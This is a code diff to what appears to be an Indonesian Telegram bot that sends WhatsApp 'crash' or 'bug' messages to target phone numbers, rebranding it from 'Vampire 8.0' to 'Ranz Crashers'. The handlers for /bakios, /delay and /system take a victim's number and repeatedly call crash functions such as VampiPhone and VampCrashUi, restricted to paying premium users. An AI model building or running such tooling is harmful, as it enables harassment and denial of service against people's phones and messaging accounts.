@@ -1205,20 +1205,21 @@ bot.onText(/\/start/, (msg) => {
   const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
 
   let ligma = `
-𖤊───⪩  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
-╭──────────────────────╮
+╭━━━『 R A N Z ✦ C R A S H E R S 』━━━━
+│
 │➼ Nᴀᴍᴇ : ${senderName}
-│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
+│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
 │➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
 │➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
 │➼ Tᴀɴɢɢᴀʟ : ${tanggal}
-╰──────────────────────╯
-╭──────────────────────╮
-│        「     𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧 𝐌𝐞𝐧𝐮    」
-╰──────────────────────╯
+│
+╰━━━━━━━━━━━
+『 𝘾𝙇𝙄𝘾𝙆 𝘽𝙐𝙏𝙏𝙊𝙉 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃 𝙄𝙉𝙄 』
+
+- © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ
 `;
 
-  bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
+  bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
       caption: ligma,
       reply_markup: {
           inline_keyboard: [
@@ -1226,22 +1227,6 @@ bot.onText(/\/start/, (msg) => {
                   {
                       text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                       callback_data: "bugmenu"
-                  },
-                  {
-                      text: "〢𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
-                      callback_data: "ownermenu"
-                  }
-              ],
-              [
-                  {
-                      text: "〢𝐓𝐨𝐨𝐥𝐬",
-                      callback_data: "toolsmenu"
-                  }
-              ],
-              [
-                  {
-                      text: "〢𝐂𝐡𝐚𝐧𝐧𝐞𝐥",
-                      url: "https://t.me/Vampireinfobot"
                   }
               ]
           ]
@@ -1255,42 +1240,34 @@ bot.onText(/\/bugmenu/, (msg) => {
   const now = new Date();
   const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
   let ligma = `
-𖤊───⪩  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
-╭──────────────────────╮
-│➼ Nᴀᴍᴇ : ${senderName}
-│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
-│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
-│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
-│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
-╰──────────────────────╯
-╭────── 「   𝐁𝐮𝐠 𝐌𝐞𝐧𝐮   」 ──────╮
-│➥ /vampori 62×××
-│➥ /vampbeta 62×××
-│➥ /vampbussines 62×××
-│➥ /vampios 62×××
-│➥ /vampdelay 62×××
-│➥ /vampui 62×××
-╰──────────────────────╯
-╭───「  𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩 & 𝐂𝐡𝐚𝐧𝐧𝐞𝐥  」───╮
-│➢ /vampgroup <Link>
-│➢ /vampch <Newsletter>
-╰──────────────────────╯
-`;
-  bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
+Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
+╭━━━━━━━━━━━━━━━━━━
+│ Select Type Crash > Delay
+╭━━━━━━━━━━━━━━━━━━
+│ Owners : @abee1945
+╭━━━━━━━━━━━━━━━━━
+│ 語  /delay
+│ 語  /bakios
+│ 語  /system
+│
+╰━━━━━━━━━━━━━━━━━━
+
+- © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ`;
+  bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
       caption: ligma,
       reply_markup: {
           inline_keyboard: [
               [
                   {
                       text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
-                      url: "https://t.me/Vampiresagara"
+                      url: "https://t.me/abee1945"
                   }
               ]
           ]
       }
   });
 });
-bot.onText(/\/ownermenu/, (msg) => {
+bot.onText(/\/ownermjdjdjenu/, (msg) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
@@ -1327,7 +1304,7 @@ bot.onText(/\/ownermenu/, (msg) => {
       }
   });
 });
-bot.onText(/\/toolsmenu/, (msg) => {
+bot.onText(/\/toolsjdjfjcmenu/, (msg) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
@@ -1571,7 +1548,7 @@ bot.onText(/\/vampbussines(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/vampios(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/bakios(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1579,21 +1556,21 @@ bot.onText(/\/vampios(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
     }
     if (!premiumUsers.includes(senderId)) {
-        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
+        return bot.sendMessage(chatId, "❌ Belom premium bang!!");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 62×××.");
+        return bot.sendMessage(chatId, "❌ Masukin Nomor \nContoh Nih : /bakios 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampios 62×××.");
+        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /bakios 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
     // Kirim notifikasi awal dengan gambar
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
 ┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
 ┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
@@ -1604,32 +1581,31 @@ bot.onText(/\/vampios(?:\s(.+))?/, async (msg, match) => {
     // Proses pengiriman bug
     for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
         await VampiPhone(formatedNumber);
-        await VampCrashUi(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /vampios
-┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
+┃〢 Cᴏᴍᴍᴀɴᴅ : /bakios
+┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/vampdelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/delay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
     if (!whatsappStatus) {
-        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
+        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu!!!");
     }
     if (!premiumUsers.includes(senderId)) {
-        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
+        return bot.sendMessage(chatId, "❌ Lu Siapa!!! Bukan Premium Mau Access Bot");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampdelay 62×××.");
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /delay 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -1640,7 +1616,7 @@ bot.onText(/\/vampdelay(?:\s(.+))?/, async (msg, match) => {
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
     // Kirim notifikasi awal dengan gambar
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
 ┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
 ┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
@@ -1653,28 +1629,28 @@ bot.onText(/\/vampdelay(?:\s(.+))?/, async (msg, match) => {
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /vampdelay
-┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
+┃〢 Cᴏᴍᴍᴀɴᴅ : /delay
+┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/vampui(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/system(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
     if (!whatsappStatus) {
-        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
+        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu!!!");
     }
     if (!premiumUsers.includes(senderId)) {
-        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
+        return bot.sendMessage(chatId, "❌ Lu Siapa!!! Bukan Premium Mau Access Bot");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampui 62×××.");
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /system 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -1685,7 +1661,7 @@ bot.onText(/\/vampui(?:\s(.+))?/, async (msg, match) => {
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
     // Kirim notifikasi awal dengan gambar
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
 ┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
 ┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
@@ -1695,21 +1671,20 @@ bot.onText(/\/vampui(?:\s(.+))?/, async (msg, match) => {
 
     for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
         await VampCrashUi(formatedNumber);
-        await VampDelayInvis(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /vampui
-┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
+┃〢 Cᴏᴍᴍᴀɴᴅ : /system
+┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/vampgroup(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/vamndnpgroup(?:\s(.+))?/, async (msg, match) => {
   const senderId = msg.from.id;
   const chatId = msg.chat.id;
 
